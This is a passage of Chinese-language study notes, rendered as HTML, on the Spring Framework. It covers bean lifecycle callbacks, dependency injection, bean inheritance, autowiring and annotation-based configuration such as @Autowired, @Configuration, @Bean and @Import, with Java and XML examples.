class="symbol">ExampleBean</span> <span class="symbol">implements</span> <span class="symbol">DisposableBean</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="built_in">void</span> destroy() &#123;</span><br><span class="line">      <span class="comment">// do some destruction work</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于基于XML的配置元数据，可以使用<strong>destroy-method</strong>属性指定具有无效无参数签名的方法的名称。例如-</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean <span class="attr">id</span> = <span class="string">"exampleBean"</span> <span class="attr">class</span> = <span class="string">"examples.ExampleBean"</span> <span class="attr">destroy-method</span> = <span class="string">"destroy"</span>/&gt;</span><br></pre></td></tr></table></figure><p>以下是类定义-</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="symbol">ExampleBean</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="built_in">void</span> destroy() &#123;</span><br><span class="line">      <span class="comment">// do some destruction work</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非Web应用程序环境中使用Spring的Ioc容器，不建议使用InitiazingBean或DisposableBean，因为XML文件配置在命名方法方法具有很大的灵活性</p><p>示例程序</p><p>HelloSpring 类中</p><p><img src="../images/java_web/image-20210404091623731.png" alt="image-20210404091623731"></p><p>MainApp 类中内容</p><p><img src="../images/java_web/image-20210404091351005.png" alt="image-20210404091351005"></p><p>bena中配置</p><p><img src="../images/java_web/image-20210404091721445.png" alt="image-20210404091721445"></p><p> 默认的初始化和销毁方法</p><p>如果您有太多具有相同名称的初始化和/或销毁方法的bean，则无需在每个单独的bean上声明<strong>init-method</strong>和<strong>destroy-method</strong>。相反，该框架提供了灵活性，可以使用<beans>元素上的<strong>default-init-method</strong>和<strong>default-destroy-method</strong>属性配置这种情况，如下所示-</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans xmlns = <span class="string">"http://www.springframework.org/schema/beans"</span></span><br><span class="line">   xmlns:xsi = <span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span><br><span class="line">   xsi:schemaLocation = <span class="string">"http://www.springframework.org/schema/beans</span></span><br><span class="line"><span class="string">   http://www.springframework.org/schema/beans/spring-beans-3.0.xsd"</span></span><br><span class="line">   <span class="keyword">default</span>-init-method = <span class="string">"init"</span> </span><br><span class="line">   <span class="keyword">default</span>-destroy-method = <span class="string">"destroy"</span>&gt;</span><br><span class="line"></span><br><span class="line">   &lt;bean id = <span class="string">"..."</span> <span class="class"><span class="keyword">class</span> </span>= <span class="string">"..."</span>&gt;</span><br><span class="line">      &lt;!-- collaborators and configuration <span class="keyword">for</span> <span class="keyword">this</span> bean go here --&gt;</span><br><span class="line">   &lt;/bean&gt;</span><br><span class="line">   </span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure><h4 id="bean-Post-Processors"><a href="#bean-Post-Processors" class="headerlink" title="bean Post Processors"></a>bean Post Processors</h4><p>BeanPostProcesser的接口定义回调方法，你可以实现提供自己的实例化逻辑</p><p>可以配置多个BeanPostProcesser接口，并且可以通过设置BeanProProcesser实现Ordered接口的order属性来控制这些BenPostProcesser接口的执行顺序</p><p>BeanPostProcessor在Bean（或对象）实例上运行，Spring IoC容器实例化bean实例，然后BeanPostProcessor接口完成其工作。</p><p>一个<strong>ApplicationContext的</strong>自动检测与该执行中定义的任何bean<strong>的BeanPostProcessor</strong>接口，并注册这些豆类如后处理器，被然后通过在容器创建bean的适当调用。</p><p><img src="../images/java_web/image-20210404094704632.png" alt="image-20210404094704632"></p><p><img src="../images/java_web/image-20210404094717165.png" alt="image-20210404094717165"></p><h4 id="Spring-Bean定义继承"><a href="#Spring-Bean定义继承" class="headerlink" title="Spring-Bean定义继承"></a>Spring-Bean定义继承</h4><p>从父定义继承配置数据，自定义根据需要覆盖某些值，或添加其他值</p><p><img src="../images/java_web/image-20210404123441729.png" alt="image-20210404123441729"></p><p>可以创建一个Bean定义模板，该模板由其它子bean定义使用，在定义Bean定义模板时，不应指定class属性，而应指定abtract属性 并且指定值为true的abstract属性</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = "1.0" encoding = "UTF-8"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span> = <span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span> = <span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span> = <span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">   http://www.springframework.org/schema/beans/spring-beans-3.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span> = <span class="string">"beanTeamplate"</span> <span class="attr">abstract</span> = <span class="string">"true"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"message1"</span> <span class="attr">value</span> = <span class="string">"Hello World!"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"message2"</span> <span class="attr">value</span> = <span class="string">"Hello Second World!"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"message3"</span> <span class="attr">value</span> = <span class="string">"Namaste India!"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span> = <span class="string">"helloIndia"</span> <span class="attr">class</span> = <span class="string">"com.tutorialspoint.HelloIndia"</span> <span class="attr">parent</span> = <span class="string">"beanTeamplate"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"message1"</span> <span class="attr">value</span> = <span class="string">"Hello India!"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"message3"</span> <span class="attr">value</span> = <span class="string">"Namaste India!"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">   </span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>父bean不能单独实例化，因为它是不完整的，而且还被明确标记为abstract，这样的定义很抽象时，它只能用作纯模板定义，用作自定义的父定义</p><h4 id="依赖注入"><a href="#依赖注入" class="headerlink" title="依赖注入"></a>依赖注入</h4><p>写复杂的应用程序时，应用程序类应尽可能独立于其它Java类， 依赖注入（或有时成为接线）有助于将这些类粘合在一起，同时保持他们的独立性</p><p>例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TextEditor</span> </span>&#123;</span><br><span class="line">   <span class="keyword">private</span> SpellChecker spellChecker;</span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">TextEditor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      spellChecker = <span class="keyword">new</span> SpellChecker();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在这里所做的是在TextEditor和SpellChecker之间创建一个依赖项。在控制方案反转的情况下，我们将改为执行以下操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TextEditor</span> </span>&#123;</span><br><span class="line">   <span class="keyword">private</span> SpellChecker spellChecker;</span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">TextEditor</span><span class="params">(SpellChecker spellChecker)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.spellChecker = spellChecker;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SpellChecker将独立实现，并将在TextEditor实例化时提供给TextEditor，整个过程由Spring框架控制</p><p>在这里，我们从TextEditor中删除了总控制权，并将其保留在其他地方（即XML配置文件），并且依赖项（即SpellChecker类）已通过<strong>Class Constructor</strong>注入到TextEditor<strong>类中</strong>。因此，控制流已通过依赖注入<code>（DI）“反转”</code>，因为您已将依赖有效地委派给了某些外部系统。</p><p>注入依赖项的第二种方法是通过TextEditor类的<strong>Setter方法</strong>，在该<strong>方法</strong>中，我们将创建SpellChecker实例。此实例将用于调用setter方法以初始化TextEditor的属性。</p><table><thead><tr><th>序号</th><th>依赖注入类型和描述</th></tr></thead><tbody><tr><td>1   基于构造函数的依赖注入</td><td>当容器调用带有多个参数的类构造函数时，将完成基于构造函数的DI，每个参数表示另一个类的依赖；</td></tr><tr><td>2  基于Setter的依赖注入</td><td>基于设置器的DI是通过调用无参数构造函数或无参数静态工厂方法以实例化您的bean之后，在您的bean上调用setter()方法来完成的</td></tr></tbody></table><p>可以混合使用基于构造函数的DI和基于Setter的DI</p><p>根据经验来说，对于强制性依赖项使用构造函数参数，对于可选的依赖项使用setter方法</p><h4 id="内部bean"><a href="#内部bean" class="headerlink" title="内部bean"></a>内部bean</h4><p><protery/>或<construcotr-arg/>元素内的<bean/>元素称为内部bean</p><p>example:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = <span class="string">"1.0"</span> encoding = <span class="string">"UTF-8"</span>?&gt;</span><br><span class="line"></span><br><span class="line">&lt;beans xmlns = <span class="string">"http://www.springframework.org/schema/beans"</span></span><br><span class="line">   xmlns:xsi = <span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span><br><span class="line">   xsi:schemaLocation = <span class="string">"http://www.springframework.org/schema/beans</span></span><br><span class="line"><span class="string">   http://www.springframework.org/schema/beans/spring-beans-3.0.xsd"</span>&gt;</span><br><span class="line"></span><br><span class="line">   &lt;bean id = <span class="string">"outerBean"</span> <span class="class"><span class="keyword">class</span> </span>= <span class="string">"..."</span>&gt;</span><br><span class="line">      &lt;property name = <span class="string">"target"</span>&gt;</span><br><span class="line">         &lt;bean id = <span class="string">"innerBean"</span> <span class="class"><span class="keyword">class</span> </span>= <span class="string">"..."</span>/&gt;</span><br><span class="line">      &lt;/property&gt;</span><br><span class="line">   &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure><h4 id="Injecting-Collection"><a href="#Injecting-Collection" class="headerlink" title="Injecting Collection"></a>Injecting Collection</h4><p>传递`Java Collection类型(例如List,Set,Map和Properties)之类的复数值, 为了处理这种情况,Spring提供了四种类型的集合配置元素,</p><table><thead><tr><th>Sr.No</th><th>Element &amp; Description</th></tr></thead><tbody><tr><td>1</td><td><strong><list></strong>This helps in wiring ie injecting a list of values, allowing duplicates.</td></tr><tr><td>2</td><td><strong><set></strong>This helps in wiring a set of values but without any duplicates.</td></tr><tr><td>3</td><td><strong><map></strong>This can be used to inject a collection of name-value pairs where name and value can be of any type.</td></tr><tr><td>4</td><td><strong><props></strong>This can be used to inject a collection of name-value pairs where the name and value are both Strings.</td></tr></tbody></table><p>可以手机用<list>或<set>连接java.util.Collection或数组的任何实现</p><p>(a)传递集合的直接值</p><p>(b)传递bean的引用作为集合元素之一</p><p>在<property></property> 标签中使用<list> 或<set>等标签</p><h5 id="注入空和空字符串值"><a href="#注入空和空字符串值" class="headerlink" title="注入空和空字符串值"></a>注入空和空字符串值</h5><p>如果您需要传递一个空字符串作为值，则可以按以下方式传递它：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean <span class="built_in">id</span> = <span class="string">"..."</span> <span class="built_in">class</span> = <span class="string">"exampleBean"</span>&gt;</span><br><span class="line">   &lt;<span class="keyword">property</span> <span class="built_in">name</span> = <span class="string">"email"</span> value = <span class="string">""</span>/&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure><p>上面的示例等效于Java代码：exampleBean.setEmail（“”）</p><p>如果需要传递NULL值，则可以按以下方式传递它-</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id = <span class="string">"..."</span> <span class="keyword">class</span> = "<span class="symbol">exampleBean</span>"&gt;</span><br><span class="line">   &lt;<span class="symbol">property</span> <span class="symbol">name</span> = "<span class="symbol">email</span>"&gt;&lt;<span class="symbol">null</span>/&gt;&lt;/<span class="symbol">property</span>&gt;</span><br><span class="line">&lt;/<span class="symbol">bean</span>&gt;</span><br></pre></td></tr></table></figure><p>上面的示例等效于Java代码: exampleBean.setEmail(null)</p><h4 id="auto-Wiring"><a href="#auto-Wiring" class="headerlink" title="auto-Wiring"></a>auto-Wiring</h4><p>自动连线 </p><p>Spring自动装备协作bean之间的关系,而无需是由<constructor-arg> 和<property> 标签</p><h4 id="基于注解的配置"><a href="#基于注解的配置" class="headerlink" title="基于注解的配置"></a>基于注解的配置</h4><p>使用注释配置依赖项注入</p><p>注释注入在XML注入之间执行,因此,对于通过两种方法俩连接的属性,后一种配置将覆盖前者</p><p>默认情况下,Spring容器中的注释接线未打开.因此,在使用基于注解的连接之前,需要在Spring配置文件之中启用它 </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = "1.0" encoding = "UTF-8"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span> = <span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span> = <span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:context</span> = <span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span> = <span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">   http://www.springframework.org/schema/beans/spring-beans-3.0.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">   http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">   http://www.springframework.org/schema/context/spring-context-3.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- bean definitions go here --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置了<a href="contex:annotation-config/">contex:annotation-config/</a> 就可以开始注释代码</p><p>Let us look at a few importment annotations to understand how they work -</p><table><thead><tr><th></th><th>注释于说明</th></tr></thead><tbody><tr><td>1  @Required</td><td>用于bean属性设置器方法</td></tr><tr><td>2  @Autowried</td><td>应用于属性设置器方法,非设置器方法,构造函数和属性</td></tr><tr><td>3  @Qualifier</td><td>与@Autowried一起使用,可以通过要连接的确切bean来消除混淆</td></tr><tr><td>4  JSR_250 Annotations</td><td>Spring支持基于JSR-250的注释,其中包括@Resource, @PostConstruct和 @PreDestory 注释</td></tr></tbody></table><h5 id="Requtire"><a href="#Requtire" class="headerlink" title="@Requtire"></a>@Requtire</h5><p>在属性上添加@Required 将必须为此属性(变量)传递值(在Bean.xml文件中)</p><h5 id="Autowired"><a href="#Autowired" class="headerlink" title="@Autowired"></a>@Autowired</h5><p>设置在 setter方法上则不用在bean.xml文件中添加其<bean>标签</p><p>比如用在bean中bean里,则不用再写到内部bean中 ,</p><p><img src="../images/java_web/image-20210404172934053.png" alt="image-20210404172934053"></p><p>使用后</p><p><img src="../images/java_web/image-20210404172921819.png" alt="image-20210404172921819"></p><p><a href="https://www.tutorialspoint.com/spring/spring_autowired_annotation.htm" target="_blank" rel="noopener">剩下用法参考</a></p><p>直接用在属性上 , 摆脱setter方法 当您使用<property>传递自动装配属性的值时，Spring会自动为这些属性分配传递的值或引用。</p><p>用在构造函数上  构造函数@Autowired批注知识即使在XML文件中配置Bean时不适用任何<contructor-arg>元素,也应在创建Bean时自动构造该构造函数</p><p>可以在构造函数内直接创建对象</p><p>@Autowired with(required=false)选项</p><p>默认情况下，@ Autowired批注表示与@Required批注类似，需要依赖项，但是，可以通过对@Autowired使用<strong>（required = false）</strong>选项来关闭默认行为。</p><p>即使您没有为age属性传递任何值，但仍将要求name属性，下面的示例仍然有效。您可以自己尝试该示例，因为除了仅更改了<strong>Student.java</strong>文件之外，它与@Required注释示例相似。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tutorialspoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">   <span class="keyword">private</span> Integer age;</span><br><span class="line">   <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Autowired</span>(required=<span class="keyword">false</span>)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(Integer age)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.age = age;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> Integer <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> age;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="meta">@Autowired</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.name = name;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> name;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Configuration和-Bean批注"><a href="#Configuration和-Bean批注" class="headerlink" title="Configuration和@Bean批注"></a>Configuration和@Bean批注</h4><p>用@Configuration注释一个类表示该类可以被Spring Ioc容器用作定义Bean的原 @Bean注释告诉Spring使用@Bean注释的方法将返回一个对象,该对象应在Sprign应用程序的上下文中注册为Bean,最简单的@Configuration类如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloConfiguration</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> HelloSpring <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> HelloSpring();</span><br><span class="line">        <span class="comment">//这里的HelloSpring 是已经写好的类 ,定义好了setter方法和属性</span></span><br><span class="line">        <span class="comment">//也可以直接创建本类的对象  return  HelloConfiguration() </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>等效于在XML中配置</p><bean id="hello" class="location.HelloConfiguration"/><p>方法名称用@Bean标注为Bean ID,它创建并返回实际的Bean,类中可以有多个@Bean的声明,一旦定义了配置类,就可以使用 <em>AnnotationConfigApplicationContex</em> 将他们加载出来并提供给Spring容器 </p><p>使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">     ApplicationContext context = <span class="keyword">new</span> AnnotationConfigApplicationContext(HelloConfiguration<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">     HelloSpring helloSpring = context.getBean(HelloSpring<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">     helloSpring.setMessage1(<span class="string">"你好 @bean 注释"</span>);</span><br><span class="line">     helloSpring.getMessage1();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>您可以按如下方式加载各种配置类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">   AnnotationConfigApplicationContext ctx = <span class="keyword">new</span> AnnotationConfigApplicationContext();</span><br><span class="line"></span><br><span class="line">   ctx.register(AppConfig<span class="class">.<span class="keyword">class</span>, <span class="title">OtherConfig</span>.<span class="title">class</span>)</span>;</span><br><span class="line">   ctx.register(AdditionalConfig<span class="class">.<span class="keyword">class</span>)</span>; </span><br><span class="line">   ctx.refresh();</span><br><span class="line"></span><br><span class="line">   MyService myService = ctx.getBean(MyService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">   myService.doStuff();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>@Import  Annotation</p><p>@Import annotation 允许直接从其他 Configuration类中加载@Bean定义(denfinition)</p><p>as follows(如下)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConfigA</span> </span>&#123;</span><br><span class="line">   <span class="meta">@Bean</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> A <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> A(); </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>You can import above Bean declaration in another Bean Declaration as follows −</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@Import</span>(ConfigA<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">ConfigB</span> </span>&#123;</span><br><span class="line">   <span class="meta">@Bean</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> B <span class="title">b</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> B(); </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在,不需要实例化时去指定 ConfigA和Config ,只需要提供ConfigB</p><p>as follows </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">   ApplicationContext ctx = <span class="keyword">new</span> AnnotationConfigApplicationContext(ConfigB<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// now both beans A and B will be available...</span></span><br><span class="line">   A a = ctx.getBean(A<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">   B b = ctx.getBean(B<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="生命周期回调"><a href="#生命周期回调" class="headerlink" title="生命周期回调"></a>生命周期回调</h5><p>@Bean注释支持指定任意的初始化和销毁方法 ,像咋Spring XML 上的 init-mehtod 和 destroy-method 属性一样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="comment">// initialization logic</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cleanup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="comment">// destruction logic</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AppConfig</span> </span>&#123;</span><br><span class="line">   <span class="meta">@Bean</span>(initMethod = <span class="string">"init"</span>, destroyMethod = <span class="string">"cleanup"</span> )</span><br><span class="line">   <span class="function"><span class="keyword">public</span> Foo <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> Foo();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="指定Bean范围"><a href="#指定Bean范围" class="headerlink" title="指定Bean范围"></a>指定Bean范围</h5><p>默认范围为单例,但可以使用@Bean 注释(annotation)重写它</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AppConfig</span></span>&#123;</span><br><span class="line"> <span 